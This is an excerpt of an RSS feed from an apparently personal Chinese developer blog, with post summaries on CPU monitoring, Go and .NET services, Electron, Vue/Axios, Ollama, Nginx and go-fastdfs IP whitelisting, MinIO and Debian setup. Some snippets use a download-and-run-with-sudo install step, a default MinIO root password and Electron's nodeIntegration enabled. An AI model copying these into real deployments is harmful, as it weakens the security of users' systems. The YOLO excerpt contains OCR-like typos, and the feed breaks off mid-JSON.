ps aux --sort=-%cpu | head pidstat - 用于监视个别任务的CPU和内存使用情况，通常与时间结合使用。
pidstat 1 这些命令会以实时或者定时的方式输出CPU占用前几的进程，帮助识别和解决CPU占用高的问题。
查看docker docker ps docker ps -a docker start cont C# 获取Cpu win PerformanceCounter 实例，用于监控总 CPU 使用率（&amp;quot;_Total&amp;quot; 表示监控所有 CPU 核心的总体使用情况）。
dotnet add package System.Diagnostics.PerformanceCounter // 创建一个用于获取 CPU 占用率的 PerformanceCounter 对象 PerformanceCounter cpuCounter = new PerformanceCounter(&amp;#34;Processor&amp;#34;, &amp;#34;% Processor Time&amp;#34;, &amp;#34;_Total&amp;#34;); // 先执行一次 NextValue()，因为第一次调用通常会返回 0 cpuCounter.NextValue(); Thread.Sleep(1000); // 等待 1 秒以便获取准确值 while (true) { // 获取当前的 CPU 使用率 float cpuUsage = cpuCounter.</description></item><item><title> Go Background</title><link>https://qfsyso.github.io/posts/go-background/</link><pubDate>Mon, 05 Aug 2024 01:44:01 +0000</pubDate><guid>https://qfsyso.github.io/posts/go-background/</guid><description>debian go程序 后台运行 要在Debian系统上将Go程序设置为后台运行，使用nohup命令和&amp;amp;符号。
编译Go程序，生成可执行文件。
go build -o myapp main.go 使用nohup将程序放到后台运行，并将输出重定向到nohup.out文件。
nohup ./myapp &amp;amp; 如果您想要程序在系统启动时自动运行，可以创建一个systemd服务文件。
创建一个名为myapp.service的文件：
sudo nano /etc/systemd/system/myapp.service 在编辑器中添加以下内容：
[Unit] Description=My Go Application After=network.target [Service] Type=simple ExecStart=/path/to/your/myapp Restart=on-failure RestartSec=5 [Install] WantedBy=multi-user.target 保存并退出编辑器。
启用并启动服务：
sudo systemctl enable myapp.service sudo systemctl start myapp.service Go程序就会在Debian系统上作为服务后台运行。
c# run~ sudo nohup dotnet run /root/socketa/TcpSk &amp;gt; output20240805.log 2&amp;gt;&amp;amp;1 &amp;amp; sudo nohup dotnet run /root/netser/xx &amp;gt; output1.log 2&amp;gt;&amp;amp;1 &amp;amp; ps -ef | grep nohup kill</description></item><item><title>C# keep alive</title><link>https://qfsyso.github.io/posts/c%23-keep-alive/</link><pubDate>Mon, 05 Aug 2024 00:38:00 +0000</pubDate><guid>https://qfsyso.github.io/posts/c%23-keep-alive/</guid><description>在C#中，想让一个控制台应用程序保持运行而不依赖 Cnsole.ReadKey()，可以通过多种方式实现。
1. 使用事件循环 可以使用 EventWaitHandle 或者其他类似的同步原语来创建一个事件循环，让程序保持在等待状态。
using System; using System.Threading; class Program { static void Main() { // 创建一个自动重置的事件对象 EventWaitHandle waitHandle = new EventWaitHandle(false, EventResetMode.AutoReset); Console.WriteLine(&amp;#34;Press any key to exit...&amp;#34;); // 等待事件被设置，如果没有接收到信号，则保持等待状态 waitHandle.WaitOne(); Console.Clear(); } } 使用无限循环 你可以创建一个无限循环，直到你手动终止程序。
//cpu占用高~ using System; class Program { static void Main() { while (true) { // 程序在这里保持运行状态，等待事件或其他中断。 Console.WriteLine(&amp;#34;The program is running. Press CTRL+C to exit.&amp;#34;); } } } 3. 使用定时器 创建一个定时器，定期执行某些任务，或者用于控制程序行为。
using System; using System.</description></item><item><title>Electron App</title><link>https://qfsyso.github.io/posts/electron-app/</link><pubDate>Sun, 04 Aug 2024 21:28:01 +0000</pubDate><guid>https://qfsyso.github.io/posts/electron-app/</guid><description>Electron fetch API发送HTTP请求 npm install electron --save-dev 创建： your-electron-app/ ├── main.js ├── renderer.js └── index.html
main.js - Electron
const { app, BrowserWindow } = require(&amp;#39;electron&amp;#39;); function createWindow () { // 创建浏览器窗口 let win = new BrowserWindow({ width: 800, height: 600, webPreferences: { nodeIntegration: true } }); // 加载index.html文件 win.loadFile(&amp;#39;index.html&amp;#39;); } app.whenReady().then(createWindow); renderer.js - Electron的渲染器进程文件，使用fetch发送请求： document.addEventListener(&amp;#39;DOMContentLoaded&amp;#39;, () =&amp;gt; { fetch(&amp;#39;https://jsonplaceholder.typicode.com/posts/1&amp;#39;) .then(response =&amp;gt; response.json()) .then(data =&amp;gt; { document.getElementById(&amp;#39;result&amp;#39;).textContent = JSON.stringify(data, null, 2); }) .</description></item><item><title>Axios Cors &amp;&amp; Timestamp</title><link>https://qfsyso.github.io/posts/axios-cors-timestamp/</link><pubDate>Sun, 04 Aug 2024 12:16:25 +0000</pubDate><guid>https://qfsyso.github.io/posts/axios-cors-timestamp/</guid><description>具体步骤 安装 Axios: 使用 Axios 进行 HTTP 请求。
封装 Axios: 将 Axios 封装成一个模块以便在项目中复用。
解决跨域问题: 在 vite.config.ts 文件中配置代理以解决跨域问题。
调用 API: 在 Vue 组件中使用封装的 Axios 进行数据请求和显示。
安装 Axios 首先，确保你已经安装了 Axios：
bash Copy Code npm install axios
封装 Axios 创建一个 http 文件夹并在其中创建一个 request.ts 文件：
src/http/request.ts:
import axios from &amp;#39;axios&amp;#39;; const service = axios.create({ baseURL: &amp;#39;http://localhost:16552/api/zblack&amp;#39;, // 根据你的后端API地址调整 timeout: 5000, // 请求超时时间 }); // 请求拦截器 service.interceptors.request.use( config =&amp;gt; { return config; }, error =&amp;gt; { console.</description></item><item><title>yolov10</title><link>https://qfsyso.github.io/posts/yolov10/</link><pubDate>Mon, 29 Jul 2024 23:49:16 +0000</pubDate><guid>https://qfsyso.github.io/posts/yolov10/</guid><description>YOLOv3、YOLov3-Ultralytics和YOLOv3u 概述 本文件概述了三种密切相关的物体检测模型，即YOLOv3、YOLOv3-Ultralytics 和YOLOv3u。 1.YOLOv3:这是&amp;quot;You Only Look Once&amp;quot;(YOLO)物体检测算法的第三个版本。YOLOv3最初由约瑟夫-雷德蒙(Joseph Redmon)开发，通过引入多尺度预测和三种不同大小的检测内核等功能，YOLOv3 对其前身进行了改进。 YOLOv3-Ultralvtics: 这是Ultralvtics&amp;rsquo; YOLov3 模型的实现。它再现了原始的 YOLOv3 架构，并提供了更多的功2. 能，如支持更多的预训练模型和更简单的定制选项。 YOLOv3u:这是 yOLOv3-ultralvtics 的更新版本，它采用了YOLOv8 模型中使用的无锚、无对象性分割头,3. YOLOv3u 保留了与 YOLOv3 相同的骨干和颈部结构，但使用了YOLOv8 更新的检测头。
YOLov4:高速、精确的物体探测 欢迎访问Ultralytics YoLov4 文档页面，YOLOv4 是由 Alexey Bochkovskiy于 2020,年在https://github.com/AlexeyAB/darknet 推出的最先进的实时物体检测器。 YOLOv4 的设计在速度和精确度之间实现了最佳平衡，是许多应用的理想选择。
YOLOv5u 代表着物体检测方法的进步。YOLOv5u 源自 开发的 YOLOv5 Ultralvtics 开发的模型的基础结构，YOLOv5u整合了无锚点、无对象性的分割头，这是以前的 YOLov8模型中引入的功能。这一调整完善了模型的架构，从而提高了物体检测任务中的精度·速度权衡。鉴于经验结果及其衍生特征，YOLov5u 为那些在研究和实际应用中寻求稳健解决方案的人提供了一个高效的替代方案。
美团YOLOv6 是一款先进的物体检测器，在速度和准确性之间取得了出色的平衡，是实时应用的热门选择。该模型在架构和训练方案上引入了几项显著的改进，包括双向串联(Bic)模块、锚点辅助训练(AAT)策略以及改进的骨干和颈部设计，从而在 COCo 数据集上实现了最先进的精度。 Bic AAT
YOLOv7: 可训练的免费书包 YOLOv7 是最先进的实时物体检测器，在5FPS 到 160 FPS 的范围内，其速度和准确性都超过了所有已知的物体检测器。在GPU V100 上，YOLOv7 的准确率(56.8% AP)在 30 FPS 或更高的所有已知实时物体检测器中是最高的。此外，YOLOv7 在速度和准确性上都优于 YOLOR、YOLOX、Scaled-YOLOv4、YOLOv5 等其他物体检测器。该模型是在 MS COC0 数据集上从头开始训练的，没有使用任何其他数据集或预先训练的权重。YoLov7 的源代码可在GitHub 上获取。</description></item><item><title> VUE npm yarn</title><link>https://qfsyso.github.io/posts/vue-npm-yarn/</link><pubDate>Sat, 27 Jul 2024 23:53:03 +0000</pubDate><guid>https://qfsyso.github.io/posts/vue-npm-yarn/</guid><description>vite cretae vue npm yarn npm init vite PN vue3 ts
cd PN npm install npm run dev or
npm install -g yarn yarn yarn dev NPM npm init 初始化某个项目 npm install/link 默认的安装依赖操作 npm install taco --save 安装某个依赖，并且默认保存到package. npm uninstall taco --save 安装某个开发时依赖项目 npm install taco --save-dev 更新某个依赖项目 npm update taco --save安装某个全局依赖项目 npm install taco --global 安装某个全局依赖项目 npm publish/login/1ogout 发布/登录/登出，一系列NPM Registry操作 npm rutest 运行某个命令 YARN yarn init 初始化某个项目 yarn install/link 默认的安装依赖操作 yarn add taco 安装某个依赖，并且默认保存到package.</description></item><item><title>.NET MSTest Xunit</title><link>https://qfsyso.github.io/posts/.net-mstest-xunit/</link><pubDate>Fri, 26 Jul 2024 23:37:05 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-mstest-xunit/</guid><description>node api 下面是一个使用 Node.js 和 Express.js 编写的简单 RESTful API 示例。
1. 初始化项目 首先，创建一个新的项目目录并进入该目录：
mkdir myapi cd myapi 然后初始化一个新的 Node.js 项目：
npm init -y 2. 安装依赖 安装 Express.js 作为我们的 Web 框架：
npm install express 3. 创建主文件 在项目根目录下创建一个名为 index.js 的文件：
touch index.js 4. 编写 RESTful API 代码 在 index.js 中编写以下代码：
const express = require(&amp;#39;express&amp;#39;); const app = express(); const port = 3000; app.use(express.json()); let items = [ { id: 1, name: &amp;#39;Item 1&amp;#39; }, { id: 2, name: &amp;#39;Item 2&amp;#39; }, { id: 3, name: &amp;#39;Item 3&amp;#39; } ]; // 获取所有项目 app.</description></item><item><title>ollama gpt qwen gemma2 deepseek loacl AI</title><link>https://qfsyso.github.io/posts/ollama-gpt-qwen-gemma2-deepseek-loacl-ai/</link><pubDate>Fri, 26 Jul 2024 23:33:08 +0000</pubDate><guid>https://qfsyso.github.io/posts/ollama-gpt-qwen-gemma2-deepseek-loacl-ai/</guid><description>ollama https://ollama.com/ ollama
https://ollama.com/library models
ollama run qwen2 send a message ollama run gemma2 https://github.com/open-webui/open-webui webui
docker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main N卡 gpu
docker run -d -p 3000:8080 --gpus all --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:cuda http://localhost:3000/
deepseek https://ollama.com/library/deepseek-coder-v2 deepseek-coder-v2 ~~ codeqwen sqlcoder
curl -X POST http://localhost:11434/api/generate -d &amp;#39;{ &amp;#34;model&amp;#34;: &amp;#34;llama2-chinese:7b-chat-q4_0&amp;#34;, &amp;#34;prompt&amp;#34;:&amp;#34;为什么天空是蓝色的&amp;#34; }&amp;#39; https://docs.openwebui.com/
单独部署Open WebUI Open WebUI https://docs.openwebui.com/ 安装默认配置</description></item><item><title> Gofastdfs whitelist</title><link>https://qfsyso.github.io/posts/gofastdfs-whitelist/</link><pubDate>Thu, 25 Jul 2024 23:46:59 +0000</pubDate><guid>https://qfsyso.github.io/posts/gofastdfs-whitelist/</guid><description>在go-fastdfs项目中，要实现IP白名单限制上传功能，你需要在处理上传请求的地方进行检查。根据你提供的代码，上传逻辑主要在server.go文件中的HttpHandler的ServeHTTP方法里通过调用mux.ServeHTTP(res, req)来分发请求到不同的处理函数。
IP白名单限制 定义白名单：首先需要定义一个变量来存储允许的IP地址。可以在server.go的Server结构体中添加一个字段来存储这个白名单。
type Server struct { // ... 其他字段 ... allowedIPs map[string]struct{} } func NewServer() *Server { server := &amp;amp;Server{ // ... 初始化其他字段 ... allowedIPs: make(map[string]struct{}), } // 假设允许的IP是 &amp;#34;192.168.1.1&amp;#34; 和 &amp;#34;10.12.188.85&amp;#34; server.allowedIPs[&amp;#34;192.168.1.1&amp;#34;] = struct{}{} server.allowedIPs[&amp;#34;10.12.188.85&amp;#34;] = struct{}{} return server } 修改HttpHandler：在HttpHandler的ServeHTTP方法中添加一个检查逻辑，以确定请求的IP是否在白名单中。
func (httpHandler *HttpHandler) ServeHTTP(res http.ResponseWriter, req *http.Request) { if !server.isIPAllowed(req) { http.Error(res, &amp;#34;Access denied&amp;#34;, http.StatusForbidden) return } // 原有的处理逻辑 mux.ServeHTTP(res, req) } func (server *Server) isIPAllowed(req *http.</description></item><item><title>Nginx whitelist</title><link>https://qfsyso.github.io/posts/nginx-whitelist/</link><pubDate>Tue, 23 Jul 2024 23:56:32 +0000</pubDate><guid>https://qfsyso.github.io/posts/nginx-whitelist/</guid><description>在 Debian 系统上安装 Nginx
更新包列表：
sudo apt update 安装 Nginx： 使用 apt 包管理器来安装 Nginx。
sudo apt install nginx 启动 Nginx：
sudo systemctl start nginx 启用开机自启动：
sudo systemctl enable nginx 检查 Nginx 状态：
sudo systemctl status nginx 配置防火墙（可选）：
sudo ufw allow &amp;#39;Nginx Full&amp;#39; 访问你的服务器： 安装完成后，你可以通过浏览器访问你的服务器 IP 地址来验证 Nginx 是否安装成功。你应该会看到默认的 Nginx 欢迎页面。
配置 HTTPS（可选）
如果你希望使用 HTTPS，可以按照以下步骤操作：
获取 SSL 证书： 可以使用 Let&amp;rsquo;s Encrypt 免费获取一个 SSL 证书。运行以下命令来安装 Certbot 和 Nginx 插件：
sudo apt install certbot python3-certbot-nginx 获取并安装证书： 运行以下命令来获取并安装证书：</description></item><item><title> .NET Web Port</title><link>https://qfsyso.github.io/posts/.net-web-port/</link><pubDate>Thu, 27 Jun 2024 01:02:56 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-web-port/</guid><description>在 .NET8 中，在 Program 类中配置服务和请求管道
示例 using Microsoft.AspNetCore.Builder; using Microsoft.AspNetCore.Hosting; using Microsoft.Extensions.DependencyInjection; using Microsoft.Extensions.Hosting; namespace WServer { public class Program { public static void Main(string[] args) { var builder = WebApplication.CreateBuilder(args); // Add services to the container. builder.Services.AddControllersWithViews(); var app = builder.Build(); // Configure the HTTP request pipeline. if (!app.Environment.IsDevelopment()) { app.UseExceptionHandler(&amp;#34;/Home/Error&amp;#34;); } app.UseStaticFiles(); app.UseRouting(); app.UseAuthorization(); app.MapControllerRoute( name: &amp;#34;default&amp;#34;, pattern: &amp;#34;{controller=Home}/{action=Index}/{id?}&amp;#34;); // 设置默认启动端口 app.Urls.Add(&amp;#34;http://localhost:5000&amp;#34;); // 这里设置为 5000 app.Run(); } } } 启动时自动从环境变量或配置文件中读取端口号</description></item><item><title> VM Linux win</title><link>https://qfsyso.github.io/posts/vm-linux-win/</link><pubDate>Mon, 24 Jun 2024 23:38:07 +0000</pubDate><guid>https://qfsyso.github.io/posts/vm-linux-win/</guid><description>debian12.5.0服务器安装 参考https://blog.csdn.net/Go_ahead_forever/article/details/132679793
相关命令问题 新用户使用sudo报错 xx is not the sudoers file. 原因：book用户没有sudo的权限 解决：https://blog.csdn.net/weixin_37787043/article/details/123045557
更新 清华-镜像源 (会快一些)： 参考文档： https://blog.csdn.net/sinat_15028281/article/details/135638596
su root cp etc/apt/sources.list etc/apt/sources.list.backup // 备份 vi etc/apt/sources.list // 修改镜像源 将etc/apt/sources.list文件内的内容清空，写入以下内容：
deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware deb https://security.</description></item><item><title>Go-fastdfs</title><link>https://qfsyso.github.io/posts/go-fastdfs/</link><pubDate>Wed, 19 Jun 2024 23:58:46 +0000</pubDate><guid>https://qfsyso.github.io/posts/go-fastdfs/</guid><description>go-fastdfs Go-fastdfs 是简单、可靠、高效的分布式文件系统。
安装 https://sjqzhang.github.io/go-fastdfs/#character
or https://github.com/sjqzhang/go-fastdfs/releases &amp;lt;!+++ releases下载 fileserver fileserver.exe &amp;ndash;&amp;gt;
启动 ./fileserver server docker部署 &amp;lt;!+++ curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh +++&amp;gt;
docker run --network=host --name fastdfs -v /data/fastdfs_data:/data -p 8080:8080 -e GO_FASTDFS_DIR=/data sjqzhang/go-fastdfs .NET 参考java实现 https://sjqzhang.github.io/go-fastdfs/usage.html#java
private static readonly string UPLOAD_PATH2 = &amp;#34;go-fastdfs地址XXX:XX&amp;#34;; [HttpPost(&amp;#34;FormFile&amp;#34;)] public async Task&amp;lt;string&amp;gt; UploadGo(IFormFile file) { if (file == null || file.Length == 0) { return &amp;#34;File is empty&amp;#34;; } string result = string.</description></item><item><title>2FA-Enable two-factor authentication (2FA)</title><link>https://qfsyso.github.io/posts/2fa-enable-two-factor-authentication-2fa/</link><pubDate>Tue, 18 Jun 2024 23:40:12 +0000</pubDate><guid>https://qfsyso.github.io/posts/2fa-enable-two-factor-authentication-2fa/</guid><description>开源免费的Authenticator: 2FA Client，支持多种浏览器。
开源地址：Authenticator-Extension https://github.com/Authenticator-Extension/Authenticator
Edge扩展：Authenticator: 2FA Client - Microsoft Edge Addons https://microsoftedge.microsoft.com/addons/detail/authenticator-2fa-client/ocglkepbibnalbgmbachknglpdipeoio
Chrome扩展：身份验证器 - Chrome 应用商店 (google.com) https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai
安装好这个扩展程序以后，再次进入GitHub验证界面，等待二维码弹出。
二维码弹出以后，点击浏览器扩展，点击Authenticator: 2FA Client
点击二维码，选择指定区域，进行操作，等待代码就可以了。
Enable two-factor authentication (2FA)</description></item><item><title>.NET MinIO</title><link>https://qfsyso.github.io/posts/.net-minio/</link><pubDate>Tue, 18 Jun 2024 23:11:40 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-minio/</guid><description>安装MinIO docker
docker run --name minio -p 9000:9000 -p 9090:9090 -d -e &amp;#34;MINIO_ROOT_USER=minio&amp;#34; -e &amp;#34;MINIO_ROOT_PASSWORD=minio123&amp;#34; -v /usr/local/minio-data:/data -v /usr/local/minio-config:/root/.minio minio/minio server data --console-address &amp;#34;:9090&amp;#34; --address &amp;#34;:9000&amp;#34; 后台创建 Buckets 访问 localhost:9000 登陆后创建Buckets io617
创建密钥 Access Keys
add package dotnet add package Minio 配置json //... &amp;#34;Minio&amp;#34;: { &amp;#34;Endpoint&amp;#34;: &amp;#34;192.168.80.xx:9000&amp;#34;,//&amp;#34;localhost:9000&amp;#34;, //90/service-account-credentials &amp;#34;AccessKey&amp;#34;: &amp;#34;EctmxSNB9FqfW6UWxxx&amp;#34;, &amp;#34;SecretKey&amp;#34;: &amp;#34;frQhYoH1k7UphMxbwK2PiG2xKadzPjxxx&amp;#34;, &amp;#34;BucketName&amp;#34;: &amp;#34;io617&amp;#34; }, //... 服务类MinioService public class MinioService { private readonly MinioClient _minioClient; private readonly string _bucketName; public MinioService(IConfiguration configuration) { var endpoint = configuration[&amp;#34;Minio:Endpoint&amp;#34;]; var accessKey = configuration[&amp;#34;Minio:AccessKey&amp;#34;]; var secretKey = configuration[&amp;#34;Minio:SecretKey&amp;#34;]; _bucketName = configuration[&amp;#34;Minio:BucketName&amp;#34;]; //http://localhost:9090/api/v1/service-account-credentials _minioClient = (MinioClient?</description></item><item><title>HarmonyOS Next WorldTime Whack Mole</title><link>https://qfsyso.github.io/posts/harmonyos-next-worldtime-whack-mole/</link><pubDate>Sat, 15 Jun 2024 23:58:57 +0000</pubDate><guid>https://qfsyso.github.io/posts/harmonyos-next-worldtime-whack-mole/</guid><description>HarmonyOS Next WorldTime Whack Mole
HarmonyOS应用 鸿蒙NEXT开发 世界时应用 打地鼠
环境 Windows 11 DevEco Studio 5.0.1 Release Version: 5.0.5.306 HarmonyOS 5.0.1(13) ArkTS ArkUI API 13
WorldTime 世界时应用 实现思路 获取时区信息 更新时间 搜索功能
代码 import { i18n } from &amp;#39;@kit.LocalizationKit&amp;#39; // 导入国际化模块，用于处理多语言 import { inputMethod } from &amp;#39;@kit.IMEKit&amp;#39; // 导入输入法模块 @ObservedV2 // 观察者装饰器，用于观察状态变化 class CityTimeInfo { // 定义城市时间信息类 @Trace cityName: string = &amp;#34;&amp;#34;; // 城市名称，初始为空字符串 @Trace currentTime: string = &amp;#34;&amp;#34;; // 当前时间，初始为空字符串 timeZone: i18n.</description></item><item><title>Golang Web Base</title><link>https://qfsyso.github.io/posts/golang-web-base/</link><pubDate>Fri, 14 Jun 2024 05:53:14 +0000</pubDate><guid>https://qfsyso.github.io/posts/golang-web-base/</guid><description>setup windows环境安装 windows环境下，go安装包安装成功后，会自动将go添加到path目录下，所以不需要再向Path环境变量中添加go
GOROOT设置：Go安装路径
“我的电脑”=》“属性”=》“高级系统设置”=》“环境变量”=》“系统环境变量”，新增GOROOT环境变量
web package main import ( &amp;#34;fmt&amp;#34; &amp;#34;net/http&amp;#34; ) func main() { http.HandleFunc(&amp;#34;/&amp;#34;, func(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, &amp;#34;Hello, m requested: %s\n&amp;#34;, r.URL.Path) }) http.ListenAndServe(&amp;#34;:24612&amp;#34;, nil) } Http Server static
http.HandleFunc(&amp;#34;/&amp;#34;, func (w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, &amp;#34;Welcome !&amp;#34;) }) fs := http.FileServer(http.Dir(&amp;#34;static/&amp;#34;)) http.Handle(&amp;#34;/static/&amp;#34;, http.StripPrefix(&amp;#34;/static/&amp;#34;, fs)) http.ListenAndServe(&amp;#34;:24612&amp;#34;, nil) gorilla/mux router
go get github.com/gorilla/mux package main import ( &amp;#34;fmt&amp;#34; &amp;#34;net/http&amp;#34; &amp;#34;github.com/gorilla/mux&amp;#34; ) func main() { r := mux.</description></item><item><title>.NET JSON2MySQL</title><link>https://qfsyso.github.io/posts/.net-json2mysql/</link><pubDate>Wed, 12 Jun 2024 22:35:33 +0000</pubDate><guid>https://qfsyso.github.io/posts/.net-json2mysql/</guid><description>这是一段json
[ { &amp;#34;id&amp;#34;: 1, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;101010100&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;北京&amp;#34;, &amp;#34;post_code&amp;#34;: &amp;#34;100000&amp;#34;, &amp;#34;area_code&amp;#34;: &amp;#34;010&amp;#34;, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:06&amp;#34; }, { &amp;#34;id&amp;#34;: 2, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;安徽&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 3, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;福建&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 4, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;甘肃&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 5, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;广东&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 6, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;广西&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 7, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;贵州&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 8, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;海南&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:03:37&amp;#34; }, { &amp;#34;id&amp;#34;: 9, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;河北&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:06&amp;#34; }, { &amp;#34;id&amp;#34;: 10, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;河南&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:07&amp;#34; }, { &amp;#34;id&amp;#34;: 11, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;黑龙江&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 12, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;湖北&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 13, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;湖南&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 14, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;吉林&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: &amp;#34;2024-06-11 17:30:07&amp;#34; }, { &amp;#34;id&amp;#34;: 15, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;江苏&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 16, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;江西&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 17, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;辽宁&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 18, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;内蒙古&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 19, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;宁夏&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 20, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;青海&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 21, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: &amp;#34;山东&amp;#34;, &amp;#34;post_code&amp;#34;: null, &amp;#34;area_code&amp;#34;: null, &amp;#34;ctime&amp;#34;: null }, { &amp;#34;id&amp;#34;: 22, &amp;#34;pid&amp;#34;: 0, &amp;#34;city_code&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;city_name&amp;#34;: 